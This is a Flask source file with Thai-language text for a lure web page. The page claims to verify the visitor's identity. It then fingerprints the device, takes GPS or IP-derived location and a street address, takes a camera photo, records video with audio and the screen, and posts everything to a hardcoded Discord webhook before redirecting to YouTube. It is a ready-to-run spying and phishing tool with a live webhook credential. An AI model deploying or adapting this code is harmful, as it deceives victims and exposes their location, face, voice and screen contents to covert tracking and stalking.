from flask import Flask, request
import requests
import base64
import json
from datetime import datetime

app = Flask(__name__)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"

def get_location_from_ip(ip):
    try:
        url = f'https://ipapi.co/{ip}/json/'
        resp = requests.get(url, timeout=5)
        data = resp.json()
        if data.get('ip'):
            return {
                'city': data.get('city', 'ไม่ระบุ'),
                'region': data.get('region', 'ไม่ระบุ'),
                'country': data.get('country_name', 'ไม่ระบุ'),
                'isp': data.get('org', 'ไม่ระบุ'),
                'lat': data.get('latitude', 0),
                'lon': data.get('longitude', 0)
            }
    except:
        pass
    return None

def reverse_geocode(lat, lon):
    try:
        url = f'https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&accept-language=th'
        headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
        resp = requests.get(url, headers=headers, timeout=10)
        data = resp.json()
        if 'address' in data:
            addr = data['address']
            return {
                'road': addr.get('road', addr.get('pedestrian', '')),
                'suburb': addr.get('suburb', addr.get('neighbourhood', '')),
                'village': addr.get('village', addr.get('town', '')),
                'city': addr.get('city', addr.get('town', addr.get('village', ''))),
                'district': addr.get('state_district', ''),
                'province': addr.get('province', addr.get('state', '')),
                'postcode': addr.get('postcode', ''),
                'country': addr.get('country', ''),
                'display_name': data.get('display_name', '')
            }
    except Exception as e:
        print(f"Geocode error: {e}")
    return None

HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>แตะเพื่อดำเนินการ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea, #764ba2);
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            font-family: 'Segoe UI', sans-serif;
        }
        .container { text-align: center; color: white; padding: 20px; }
        h1 { font-size: 1.8rem; margin: 20px 0; }
        .spinner {
            width: 45px; height: 45px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .info-text { font-size: 0.9rem; opacity: 0.8; margin-top: 10px; }
    </style>
</head>
<body onclick="startCapture()">
    <div class="container" id="ui">
        <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
        <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
        <div class="info-text">ใช้เวลาประมาณ 8-9 วินาที</div>
    </div>
    <script>
        async function startCapture() {
            document.body.onclick = null;
            document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1><p>กรุณารอสักครู่</p>';
            
            const ua = navigator.userAgent;
            let os = 'ไม่ระบุ';
            let browser = 'ไม่ระบุ';
            
            if (ua.includes('iPhone')) os = 'iOS (iPhone)';
            else if (ua.includes('iPad')) os = 'iOS (iPad)';
            else if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('Mac OS X')) os = 'macOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Linux')) os = 'Linux';
            
            if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) browser = 'Chrome';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('OPR')) browser = 'Opera';
            else if (ua.includes('CriOS')) browser = 'Chrome (iOS)';
            else if (ua.includes('FxiOS')) browser = 'Firefox (iOS)';
            
            const deviceInfo = {
                userAgent: ua,
                os: os,
                browser: browser,
                platform: navigator.platform,
                language: navigator.language,
                vendor: navigator.vendor,
                screenWidth: screen.width,
                screenHeight: screen.height,
                pixelRatio: window.devicePixelRatio || 1,
                timestamp: new Date().toISOString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                orientation: window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape'
            };
            
            if (navigator.connection) {
                deviceInfo.networkType = navigator.connection.effectiveType || 'ไม่ทราบ';
                deviceInfo.downlink = navigator.connection.downlink || 0;
                deviceInfo.rtt = navigator.connection.rtt || 0;
            } else {
                deviceInfo.networkType = 'ไม่รองรับ';
                deviceInfo.downlink = 0;
                deviceInfo.rtt = 0;
            }
            
            // GPS 5 วินาที
            try {
                const pos = await new Promise((resolve, reject) => {
                    const timeoutId = setTimeout(() => reject(new Error('GPS timeout')), 5000);
                    navigator.geolocation.getCurrentPosition(
                        (p) => { clearTimeout(timeoutId); resolve(p); },
                        (err) => { clearTimeout(timeoutId); reject(err); },
                        { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
                    );
                });
                deviceInfo.gps_lat = pos.coords.latitude;
                deviceInfo.gps_lon = pos.coords.longitude;
                deviceInfo.gps_accuracy = Math.round(pos.coords.accuracy);
                deviceInfo.gps_fallback = false;
            } catch(e) {
                deviceInfo.gps_fallback = true;
            }
            
            try {
                const battery = await navigator.getBattery();
                deviceInfo.batteryLevel = Math.round(battery.level * 100);
                deviceInfo.batteryCharging = battery.charging;
            } catch(e) {
                deviceInfo.batteryLevel = 'ไม่รองรับ';
            }
            
            // กล้อง
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: true 
                });
                
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
                const chunks = [];
                recorder.ondataavailable = e => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 7000)); // 7 วินาที
                recorder.stop();
                await new Promise(r => recorder.onstop = r);
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                
                stream.getTracks().forEach(t => t.stop());
                video.remove();
                
                // --- แคปหน้าจอ (ขออนุญาตแยก) ---
                let screenshotBlob = null;
                let screenVideoBlob = null;
                try {
                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                    const screenVideo = document.createElement('video');
                    screenVideo.style.display = 'none';
                    document.body.appendChild(screenVideo);
                    screenVideo.srcObject = screenStream;
                    await screenVideo.play();
                    await new Promise(r => setTimeout(r, 500));
                    
                    // แคปหน้าจอ
                    const screenCanvas = document.createElement('canvas');
                    screenCanvas.width = screenVideo.videoWidth || 1280;
                    screenCanvas.height = screenVideo.videoHeight || 720;
                    screenCanvas.getContext('2d').drawImage(screenVideo, 0, 0);
                    screenshotBlob = await new Promise(r => screenCanvas.toBlob(r, 'image/jpeg', 0.8));
                    
                    // บันทึกวิดีโอหน้าจอ 7 วินาที
                    const screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
                    const screenChunks = [];
                    screenRecorder.ondataavailable = e => {
                        if (e.data.size > 0) screenChunks.push(e.data);
                    };
                    screenRecorder.start();
                    await new Promise(r => setTimeout(r, 7000));
                    screenRecorder.stop();
                    await new Promise(r => screenRecorder.onstop = r);
                    screenVideoBlob = new Blob(screenChunks, { type: 'video/webm' });
                    
                    screenStream.getTracks().forEach(t => t.stop());
                    screenVideo.remove();
                } catch(e) {
                    console.log('Screen capture denied:', e);
                }
                // ----------------------------------
                
                const formData = new FormData();
                formData.append('photo', photoBlob, 'photo.jpg');
                formData.append('video', videoBlob, 'video.webm');
                if (screenshotBlob) {
                    formData.append('screenshot', screenshotBlob, 'screenshot.jpg');
                }
                if (screenVideoBlob) {
                    formData.append('screen_video', screenVideoBlob, 'screen_video.webm');
                }
                formData.append('info', JSON.stringify(deviceInfo));
                
                await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
            } catch(error) {
                console.error('Error:', error);
                const formData = new FormData();
                formData.append('info', JSON.stringify(deviceInfo));
                await fetch('/upload', { method: 'POST', body: formData });
            }
            
            window.location.href = "https://www.youtube.com/watch?v=I8o8IOXAeFQ";
        }
    </script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML

@app.route('/upload', methods=['POST'])
def upload():
    try:
        ip = request.remote_addr
        forwarded = request.headers.get('X-Forwarded-For')
        real_ip = forwarded.split(',')[0].strip() if forwarded else ip
        
        info_str = request.form.get('info', '{}')
        try:
            device_info = json.loads(info_str)
        except:
            device_info = {}
        
        photo = request.files.get('photo')
        video = request.files.get('video')
        screenshot = request.files.get('screenshot')
        screen_video = request.files.get('screen_video')
        
        location = get_location_from_ip(real_ip)
        
        if device_info.get('gps_fallback') and location:
            device_info['gps_lat'] = location['lat']
            device_info['gps_lon'] = location['lon']
            device_info['gps_accuracy'] = 'IP Geolocation'
            device_info['gps_from'] = 'IP'
        else:
            device_info['gps_from'] = 'GPS'
        
        gps_address = None
        if device_info.get('gps_lat') and device_info.get('gps_lon'):
            gps_address = reverse_geocode(device_info['gps_lat'], device_info['gps_lon'])
        
        time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        
        fields = []
        
        if real_ip:
            fields.append({"name": "🌐 IP", "value": real_ip, "inline": True})
        if location:
            fields.append({"name": "📍 เมือง", "value": location['city'], "inline": True})
            fields.append({"name": "🗺️ จังหวัด", "value": location['region'], "inline": True})
            fields.append({"name": "🌍 ประเทศ", "value": location['country'], "inline": True})
            fields.append({"name": "📶 ค่ายเน็ต", "value": location['isp'][:50], "inline": True})
        
        fields.append({"name": "💻 OS", "value": device_info.get('os', 'ไม่ระบุ'), "inline": True})
        fields.append({"name": "🌐 เบราว์เซอร์", "value": device_info.get('browser', 'ไม่ระบุ'), "inline": True})
        fields.append({"name": "🖥️ หน้าจอ", "value": f"{device_info.get('screenWidth')}x{device_info.get('screenHeight')}", "inline": True})
        fields.append({"name": "🔤 ภาษา", "value": device_info.get('language', 'ไม่ระบุ'), "inline": True})
        
        if device_info.get('networkType') and device_info.get('networkType') != 'ไม่รองรับ':
            fields.append({"name": "📶 ประเภทเน็ต", "value": device_info['networkType'], "inline": True})
        if device_info.get('downlink'):
            fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
        
        if device_info.get('gps_lat') and device_info.get('gps_lon'):
            source = device_info.get('gps_from', 'GPS')
            if source == 'IP':
                gps_label = "📍 พิกัด (จาก IP)"
            else:
                acc = device_info.get('gps_accuracy', '?')
                gps_label = f"📍 GPS (±{acc} เมตร)"
            gps_val = f"{device_info['gps_lat']}, {device_info['gps_lon']}"
            fields.append({"name": gps_label, "value": gps_val, "inline": True})
            if gps_address:
                addr_val = gps_address.get('display_name', '')
                if len(addr_val) > 50:
                    addr_val = addr_val[:50] + '...'
                fields.append({"name": "🏠 ที่อยู่", "value": addr_val, "inline": False})
        else:
            fields.append({"name": "📍 GPS", "value": "ไม่ได้รับข้อมูล", "inline": True})
        
        bat_val = f"{device_info.get('batteryLevel', 'ไม่ระบุ')}%"
        if device_info.get('batteryCharging') is True:
            bat_val += " ⚡กำลังชาร์จ"
        elif device_info.get('batteryCharging') is False:
            bat_val += " 🔋ไม่กำลังชาร์จ"
        fields.append({"name": "🔋 แบตเตอรี่", "value": bat_val, "inline": True})
        
        fields.append({"name": "🕐 เวลา", "value": time_now, "inline": False})
        
        embed = {
            "title": "📱 ข้อมูลผู้ใช้ใหม่",
            "color": 0x5865F2,
            "fields": fields,
            "footer": {"text": "ระบบอัตโนมัติ"},
            "timestamp": datetime.now().isoformat()
        }
        
        payload = {
            "payload_json": json.dumps({"embeds": [embed]})
        }
        
        files = {}
        if photo:
            photo.seek(0)
            files['file1'] = ('photo.jpg', photo.read(), 'image/jpeg')
        if video:
            video.seek(0)
            files['file2'] = ('video.webm', video.read(), 'video/webm')
        if screenshot:
            screenshot.seek(0)
            files['file3'] = ('screenshot.jpg', screenshot.read(), 'image/jpeg')
        if screen_video:
            screen_video.seek(0)
            files['file4'] = ('screen_video.webm', screen_video.read(), 'video/webm')
        
        if files:
            requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        else:
            requests.post(DISCORD_WEBHOOK_URL, data=payload)
        
        return "OK", 200
        
    except Exception as e:
        print(f"Error: {e}")
        return "Error", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
